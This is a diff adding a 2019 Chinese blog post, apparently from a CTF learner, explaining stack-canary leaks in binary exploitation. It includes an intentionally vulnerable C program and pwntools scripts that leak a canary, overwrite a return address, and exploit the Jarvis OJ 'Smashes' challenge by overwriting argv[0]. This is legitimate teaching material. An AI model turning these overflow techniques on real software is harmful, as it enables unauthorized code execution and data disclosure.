@@ -1,0 +1,617 @@
+<!DOCTYPE html><html><head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    
+    
+    <title>如何泄漏PWN中的一些信息 | Du4t的博客 | Du4t~~~~</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="keywords" content="PWN">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.css">
+    <link rel="stylesheet" href="/css/style.css?v=1.4.4">
+    
+    <script type="text/javascript">
+        // Data Center
+        var DC = {
+            reward:	false,
+            lv: JSON.parse('{"enable":false,"app_id":null,"app_key":null,"icon":true}'),
+            v: JSON.parse('{"enable":false,"appid":null,"appkey":null,"notify":true,"verify":true,"placeholder":"give me some sugers plz...","avatar":"wavatar"}'),
+            g: JSON.parse('{"enable":false,"lazy":true,"owner":"Du4t","repo":"gitment","oauth":{"client_id":null,"client_secret":null},"perPage":10}'),
+            d: JSON.parse('{"app_id":null}')
+        };
+    </script>
+    <script type="text/javascript">
+        window.lazyScripts=[];
+    </script>
+    
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class>
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap">
+      
+      <img src="/img/brand.jpg" class="brand-bg">
+      
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/100.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Du4t</h5>
+          <a href="mailto:610109615@qq.com" title="610109615@qq.com" class="mail">
+            
+              <span>6</span>
+            
+              <span>1</span>
+            
+              <span>0</span>
+            
+              <span>1</span>
+            
+              <span>0</span>
+            
+              <span>9</span>
+            
+              <span>6</span>
+            
+              <span>1</span>
+            
+              <span>5</span>
+            
+              <span>@</span>
+            
+              <span>q</span>
+            
+              <span>q</span>
+            
+              <span>.</span>
+            
+              <span>c</span>
+            
+              <span>o</span>
+            
+              <span>m</span>
+            
+          </a>
+        </hgroup>
+        
+        <ul class="menu-link">
+          
+              <li>
+                <a href="https://github.com/Du4t" target="_blank">
+                  <i class="icon icon-lg icon-github"></i>
+                </a>
+              </li>
+            
+        </ul>
+        
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class>
+              <a href="/">
+                <i class="icon icon-lg icon-home"></i>
+                HOME
+              </a>
+            </li>
+        
+            <li class>
+              <a href="/categories">
+                <i class="icon icon-lg icon-th-list"></i>
+                CATEGORIES
+              </a>
+            </li>
+        
+            <li class>
+              <a href="/tags">
+                <i class="icon icon-lg icon-tags"></i>
+                TAGS
+              </a>
+            </li>
+        
+            <li class>
+              <a href="/archives">
+                <i class="icon icon-lg icon-archives"></i>
+                ARCHIVES
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row clearfix">
+        <a href="javascript:;" class="header-icon pull-left waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">
+            <span>如何泄漏PWN中的一些信息</span>
+            
+        </div>
+        
+        <a href="javascript:;" id="site_search_btn" class="header-icon pull-right waves-effect waves-circle waves-light">
+            <i class="icon icon-lg icon-search"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+    <img src="/img/banner.jpg" class="header-bg">
+    <div class="container fade-scale">
+        <h1 class="title">如何泄漏PWN中的一些信息</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2019-11-01T11:57:15.000Z" itemprop="datePublished" class="page-time">
+  2019-11-01
+</time>
+
+
+            
+        </h5>
+        
+    </div>
+    
+
+</header>
+
+<div id="site_search">
+    <div class="search-title clearfix">
+        <span class="pull-left">
+          <i class="icon icon-lg icon-search"></i>
+        </span>
+        <input type="text" id="local-search-input" name="q" results="0" placeholder="search my blog..." class="form-control pull-left">
+        <a href="javascript:;" class="close pull-right waves-effect waves-circle waves-light">
+          <i class="icon icon-lg icon-close"></i>
+        </a>
+    </div>
+    <div id="local-search-result"></div>
+</div>
+
+
+<div class="container body-wrap">
+    <article id="post-如何泄漏PWN中的一些信息" class="post-article article-type-post" itemprop="blogPost">
+    <div class="post-card">
+        <h1 class="post-card-title">如何泄漏PWN中的一些信息</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2019-11-01 19:57:15" datetime="2019-11-01T11:57:15.000Z" itemprop="datePublished">2019-11-01</time>
+
+            
+
+
+            
+
+            
+
+
+            
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            
+            <meta name="generator" content="Hexo 3.9.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"><h2 id="敏感函数"><a href="#敏感函数" class="headerlink" title="敏感函数"></a>敏感函数</h2><p>一般来说 所有有向屏幕输出功能的函数都有泄漏Libc的可能 但是主要用到还是以下几个函数</p>
+<h3 id="puts"><a href="#puts" class="headerlink" title="puts"></a>puts</h3><p>puts函数嘛…我们的老常客..大部分漏洞都会用到它 需要注意的是 puts的截断标准是遇到 <strong>\0</strong> 即从某个地址开始一直输出 直到遇到\0为止</p>
+<h3 id="write"><a href="#write" class="headerlink" title="write"></a>write</h3><p>write函数也是大部分泄漏时利用的函数</p>
+<p>函数原型: write(int fd,const void *buf,size_t size)</p>
+<blockquote>
+<p>fd是文件操作符 当fd=1时就是向屏幕上输出 指针buf处长度为size的数据</p>
+</blockquote>
+<h2 id="泄漏Canary"><a href="#泄漏Canary" class="headerlink" title="泄漏Canary"></a>泄漏Canary</h2><blockquote>
+<p>Canary值 是在程序使用gcc编译时 开启Canary保护后生成的一个随机的值 通常会在每个函数开始时将其插入到栈中 目的是在函数返回前 检测函数的栈 (主要是返回地址) 有没有遭到攻击者篡改 通过以上描述 可以很清晰的知道 如果我们不知道Canary值的话 是不可能进行ROP操作的 在没有Canary值的情况下基本限制死了攻击者对栈上的攻击</p>
+</blockquote>
+<h3 id="泄漏Canary值"><a href="#泄漏Canary值" class="headerlink" title="泄漏Canary值"></a>泄漏Canary值</h3><p>先给出样例</p>
+<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string"><stdio.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string"><stdlib.h></span></span>
+<span class="token keyword">void</span> <span class="token function">sys</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+      <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+      <span class="token keyword">char</span> a<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+      <span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">;</span>
+      <span class="token keyword">while</span> <span class="token punctuation">(</span>i<span class="token punctuation">)</span>
+      <span class="token punctuation">{</span>            
+            <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>a<span class="token punctuation">,</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token function">puts</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            i<span class="token operator">--</span><span class="token punctuation">;</span>
+      <span class="token punctuation">}</span>
+      <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span></code></pre>
+<blockquote>
+<p>编译指令: gcc -no-pie 输出文件名 源码名</p>
+</blockquote>
+<p>首先使用checksec查看一下保护</p>
+<figure class="image-box">
+                <a rel="如何泄漏PWN中的一些信息" href="https://ae01.alicdn.com/kf/Ha848a116c2fa44208a905701b54e09bbl.png" title data-fancybox="images"><img src="https://ae01.alicdn.com/kf/Ha848a116c2fa44208a905701b54e09bbl.png" alt title class></a>
+                <p></p>
+            </figure>
+
+<p>确认和预先料想的一样 开启了Canary保护 载入IDA</p>
+<p>通过观察流程图 我们可以发现 在程序最后会校验 var_8 这个变量 如果变量和预先值不同 就触发 stack_chk_fail函数 至于这个函数的功能…看看名字就知道了啊喂… 通过这个我们就能了解 var_8变量储存的就是我们Canary值 要想通过栈溢出直接跳转到 sys函数拿到shell 就需要先泄漏出来它 </p>
+<p>通过阅读IDA的代码和栈图 我们可以明确得知程序的流程 main函数内部将会执行两次 且我们的输入是可以溢出到Canary值的 </p>
+<blockquote>
+<p>这里要介绍一下Canary值的特性 Canary值是随机的 但是最后两位一定是00 目的是为了00截断防止前面录入的字符串输出时 捎带着把Canary值输出出来</p>
+</blockquote>
+<p>那么思考一下 我们可以利用Canary值的特性 我们破坏掉值最后的00 通过输出函数将其输出出来不就好了么 等到main函数第二遍执行的时候 我们将泄漏出来的值再覆盖回去即可 </p>
+<p>脚本如下</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>
+sh<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">"./canary"</span><span class="token punctuation">)</span>
+file<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">"./canary"</span><span class="token punctuation">)</span>
+sys_addr<span class="token operator">=</span>file<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'sys'</span><span class="token punctuation">]</span>
+payload<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x68</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x68</span><span class="token punctuation">)</span>
+canary<span class="token operator">=</span>u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x0a</span>
+log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"canary:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+
+payload2<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x68</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x8</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>file<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>
+
+
+sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+<blockquote>
+<p>这里纠结了好久 不清楚为什么打不开shell 很是头疼加恼火 以后再处理 这里返回主函数以证明确实绕过了Canary保护 并实现了栈溢出</p>
+</blockquote>
+<h3 id="利用stack-chk-fail漏洞"><a href="#利用stack-chk-fail漏洞" class="headerlink" title="利用stack_chk_fail漏洞"></a>利用stack_chk_fail漏洞</h3><p>其实这是另外一种叫做SSP Leak的手法.. 其目的是故意触发Canary保护 让程序流向stack_chk_fail函数</p>
+<blockquote>
+<p>首先来科普下 stack_chk_fail的函数原型</p>
+<pre class=" language-c"><code class="language-c"><span class="token function">__stack_chk_fail</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> 
+<span class="token punctuation">{</span>
+
+<span class="token function">__fortify_fail</span> <span class="token punctuation">(</span><span class="token string">"stack smashing detected"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token punctuation">}</span></code></pre>
+<pre class=" language-c"><code class="language-c"><span class="token function">__fortify_fail</span> <span class="token punctuation">(</span>msg<span class="token punctuation">)</span>
+constchar<span class="token operator">*</span>msg<span class="token punctuation">;</span> 
+<span class="token punctuation">{</span>
+
+<span class="token comment" spellcheck="true">/* The loop is added only to keep gcc happy. */</span>
+
+<span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+
+<span class="token function">__libc_message</span> <span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">"*** %s ***: %s terminated\n"</span><span class="token punctuation">,</span> msg<span class="token punctuation">,</span>__libc_argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token punctuation">:</span><span class="token string">""</span><span class="token punctuation">)</span>
+
+<span class="token punctuation">}</span>
+<span class="token function">libc_hidden_def</span> <span class="token punctuation">(</span>__fortify_fail<span class="token punctuation">)</span></code></pre>
+</blockquote>
+<p>可以通过函数明确了解到 如果我们能控制argv[0]指针的位置 那我们就能输出任意值<br>而控制argv[0]的位置通常有两种方式 一种是暴力覆盖 因为其为一个变量 且通常为文件名 那么他就一定在栈上 通过栈溢出 直接覆盖全部栈为我们想要的地址 就一定会将argv[0]指针的值覆盖为我们想要的 还有一种就是计算偏移 因为其值为文件名 观察栈指定覆盖即可</p>
+<h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><p>这里使用 Jarvis OJ 的题目Smashes 进行演示</p>
+<p>首先checksec 查看保护</p>
+<figure class="image-box">
+                <a rel="如何泄漏PWN中的一些信息" href="https://ae01.alicdn.com/kf/Hbd06c905aa8946aa988f134913022d9bB.png" title data-fancybox="images"><img src="https://ae01.alicdn.com/kf/Hbd06c905aa8946aa988f134913022d9bB.png" alt title class></a>
+                <p></p>
+            </figure>
+
+<p>发现开有Canary保护 不能直接进行ROP 载入IDA 发现没有任何能用于输出flag的方式 但是发现一个奇怪的字符串</p>
+<figure class="image-box">
+                <a rel="如何泄漏PWN中的一些信息" href="https://ae01.alicdn.com/kf/Hedb1c5785ce645b7820b506d8ff69021X.png" title data-fancybox="images"><img src="https://ae01.alicdn.com/kf/Hedb1c5785ce645b7820b506d8ff69021X.png" alt title class></a>
+                <p></p>
+            </figure>
+
+<p>也就是说flag的地址就是这个地方 如果写出脚本能够输出这个位置的值 就能得到flag</p>
+<p>联系到SSP leak 我们可以故意触发stack_chk_fail函数 然后将指针指向这个地址就能利用报错信息输出flag了</p>
+<p>但是看到主函数的最后一句 发现这个位置的flag会在主函数返回之前就清除掉 这个时候就需要用到ELF的重映射了</p>
+<figure class="image-box">
+                <a rel="如何泄漏PWN中的一些信息" href="https://ae01.alicdn.com/kf/Hc3145c65c7a74b149a1db1c3b888bf83f.png" title data-fancybox="images"><img src="https://ae01.alicdn.com/kf/Hc3145c65c7a74b149a1db1c3b888bf83f.png" alt title class></a>
+                <p></p>
+            </figure>
+
+<p>我们使用gdb 看看程序是否有flag的重映射</p>
+<figure class="image-box">
+                <a rel="如何泄漏PWN中的一些信息" href="https://ae01.alicdn.com/kf/H4a5f879530e04a619be0925cdc11a758s.png" title data-fancybox="images"><img src="https://ae01.alicdn.com/kf/H4a5f879530e04a619be0925cdc11a758s.png" alt title class></a>
+                <p></p>
+            </figure>
+
+<p>发现在0x400d20处还映射的有flag 那么我们直接将0x400d20覆盖满整个栈即可</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+r<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'pwn.jarvisoj.com'</span><span class="token punctuation">,</span><span class="token number">9877</span><span class="token punctuation">)</span>
+
+r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'name?'</span><span class="token punctuation">)</span>
+payload<span class="token operator">=</span>p64<span class="token punctuation">(</span><span class="token number">0x400d20</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">200</span>
+r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+
+r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+<p>运行脚本即可</p>
+<figure class="image-box">
+                <a rel="如何泄漏PWN中的一些信息" href="https://ae01.alicdn.com/kf/Ha99e3eabb7d447afa66ab934d84f2b12X.png" title data-fancybox="images"><img src="https://ae01.alicdn.com/kf/Ha99e3eabb7d447afa66ab934d84f2b12X.png" alt title class></a>
+                <p></p>
+            </figure>
+
+
+<h2 id="泄漏libc"><a href="#泄漏libc" class="headerlink" title="泄漏libc"></a>泄漏libc</h2><script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"live2d-widget-model-wanko"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"live2d-widget-model-wanko"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script>
+        </div>
+        
+<blockquote class="post-copyright">
+    <div class="content">
+        
+<span class="post-time">
+    最后更新时间：<time datetime="2019-11-02T05:36:16.118Z" itemprop="dateUpdated">2019-11-02 13:36:16</time>
+</span><br>
+
+
+        
+        转载注明出处，原文地址：<a href="/2019/11/01/ru-he-xie-lou-pwn-zhong-de-yi-xie-xin-xi/" target="_blank" rel="external">http://Du4t.github.io/2019/11/01/ru-he-xie-lou-pwn-zhong-de-yi-xie-xin-xi/</a>
+        
+    </div>
+    <footer>
+        <a href="http://Du4t.github.io">
+            <img src="/img/100.jpg" alt="Du4t">
+            Du4t
+        </a>
+    </footer>
+</blockquote>
+
+        
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PWN/">PWN</a></li></ul>
+
+            <div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://Du4t.github.io/2019/11/01/ru-he-xie-lou-pwn-zhong-de-yi-xie-xin-xi/&title=《如何泄漏PWN中的一些信息》 — Du4t的博客&pic=http://Du4t.github.io/img/100.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://Du4t.github.io/2019/11/01/ru-he-xie-lou-pwn-zhong-de-yi-xie-xin-xi/&title=《如何泄漏PWN中的一些信息》 — Du4t的博客&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+        </div>
+        
+            
+
+
+        
+    </div>
+    
+<nav class="post-nav flex-row flex-justify-between flex-row-reverse">
+  
+
+  
+    <div class="next">
+      <a href="/2019/10/26/unctf-wp/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">UNCTF-WP</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+    
+    
+        <aside class="post-widget">
+            <nav class="post-toc-wrap" id="post-toc">
+                <strong>目录</strong>
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#敏感函数"><span class="post-toc-number">1.</span> <span class="post-toc-text">敏感函数</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#puts"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">puts</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#write"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">write</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#泄漏Canary"><span class="post-toc-number">2.</span> <span class="post-toc-text">泄漏Canary</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#泄漏Canary值"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">泄漏Canary值</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#利用stack-chk-fail漏洞"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">利用stack_chk_fail漏洞</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#实例"><span class="post-toc-number">2.2.1.</span> <span class="post-toc-text">实例</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#泄漏libc"><span class="post-toc-number">3.</span> <span class="post-toc-text">泄漏libc</span></a></li></ol>
+            </nav>
+            <div class="toc-bar"><div>
+        </div></div></aside>
+    
+</article>
+
+
+</div>
+
+    </main>
+    <footer class="footer ">
+    
+    <div class="bottom">
+        <p>
+            <span>
+                Du4t © 2019
+            </span>
+        		
+           	
+            
+            
+            <span>
+	            Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/codefine/hexo-theme-mellow" target="_blank">mellow</a>
+            </span>
+            
+            
+            
+
+            
+                
+<span class="site-uv" title="总访客量">
+    <i class="icon icon-user"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
+</span>
+
+
+<span class="site-pv" title="总访问量">
+    <i class="icon icon-eye"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>
+</span>
+
+            
+        </p>
+    </div>
+</footer>
+
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://Du4t.github.io/2019/11/01/ru-he-xie-lou-pwn-zhong-de-yi-xie-xin-xi/&title=《如何泄漏PWN中的一些信息》 — Du4t的博客&pic=http://Du4t.github.io/img/100.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://Du4t.github.io/2019/11/01/ru-he-xie-lou-pwn-zhong-de-yi-xie-xin-xi/&title=《如何泄漏PWN中的一些信息》 — Du4t的博客&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACqklEQVR42u3aUU/DUAgG0P3/P62Jr6btB1w2TU6fljk7zjUpCLxe8fX1c+Xv/H6d3+H3+1efP3bh4eHhtUK/uq4+k4R1H+j9N95/b34HPDw8vD3e/YP44Ra3X5kEen9YyW9dvo+Hh4f3Ud49qVdq5+UyHh4e3v/lTRLAfWrpNTvw8PDwPsVLgq4G2jug3iEe6LXg4eHhxbzqAOwvvF6c7+Hh4eENpup5kkjGYHkZnSeJh2jx8PDwFnjV0VQyoOq1IapHlh8NHh4e3javGm4y/u81ZMuMq2YuHh4e3lFe79/+6vpUNKYKRl/lZi4eHh7eMu/UylTvQd/jPdwBDw8Pb41XDW7e0q0uLjSbFHh4eHhv4W0/uKupaDIkw8PDw9vgTQC9cnwSehWJh4eHt8FLfi1ZIEiWA3rDtt4wDA8PD2+bl6+lJolhsjLVO+KH1QE8PDy8BV51OWDSrp03hQv3wcPDw1vmVR/9SXFcTQDJJ/MEhoeHh7fHywdgSUDVtkLCaC434OHh4S3wJtckDeSrWmf/AHh4eHhz3qm2bC8N9D5TGKHh4eHhvYVXfdwnPz01SCsvE+Dh4eEt8M62Hu55CWmyRoCHh4f3KV4SYq+MztPMPEXh4eHhvYeXrwJM2hOTpm0OxsPDw9vjnR1fVYvjeQO3MADDw8PDeyMvL3nz4JIjmKSlVzXP4OHh4Y1XrE6B523fV/FqtnHx8PDwjq4O5E2KapGdHO6oOYKHh4e3wJtUob1A8+NIGJNDxMPDw5vweskgXy+o1vjVxPBQjuPh4eGt8fLSNh/8V8GTA2p2VvDw8PCWedVBV3Vg1iujH2LDw8PD+8O85IHeWzLIh2SjkhoPDw+vyMubEUmgk4ZFdZng4Q54eHh4C7zJAGz+xb3CerKYhYeHhzfgfQNnMDXKfYnJ8AAAAABJRU5ErkJggg==" alt="微信分享二维码">
+</div>
+
+
+    
+    <!-- main-js -->
+<script type="text/javascript" src="//cdn.bootcss.com/jquery/2.1.0/jquery.min.js"></script>
+<script type="text/javascript" src="/js/plugins/fastclick.js?v=1.4.4"></script>
+<script type="text/javascript" src="/js/plugins/ios-orientationchange-fix.js?v=1.4.4"></script>
+<script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.js"></script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+
+<script type="text/javascript" src="/js/method.js?v=1.4.4"></script>
+<script type="text/javascript" src="/js/blog.js?v=1.4.4"></script>
+
+<!-- third-party -->
+
+
+
+
+
+
+<script type="text/javascript" src="/js/plugins/local_search.js?v=1.4.4"></script>
+<script type="text/javascript">
+	var search_path = "search.xml";
+	if (search_path.length === 0) {
+		search_path = "search.xml";
+	}
+	var path = "/" + search_path;
+	searchFunc(path, "local-search-input", "local-search-result");
+</script>
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+    
+    
+
+
+
+
+
+    <!-- mathjax config similar to math.stackexchange -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+            processEscapes: true,
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+
+
+
+    <script>
+    (function() {
+        var OriginTitile = document.title, titleTime;
+        document.addEventListener('visibilitychange', function() {
+            if (document.hidden) {
+                document.title = '死鬼去哪里了！';
+                clearTimeout(titleTime);
+            } else {
+                document.title = '(つェ⊂)咦!又好了!';
+                titleTime = setTimeout(function() {
+                    document.title = OriginTitile;
+                },2000);
+            }
+        });
+    })();
+</script>
+
+
+
+
+
+    
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"live2d-widget-model-wanko"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script>
+
+<script type="text/javascript" charset="utf-8" src="/js/lazyload-plugin/lazyload.intersectionObserver.min.js"></script></body></html>
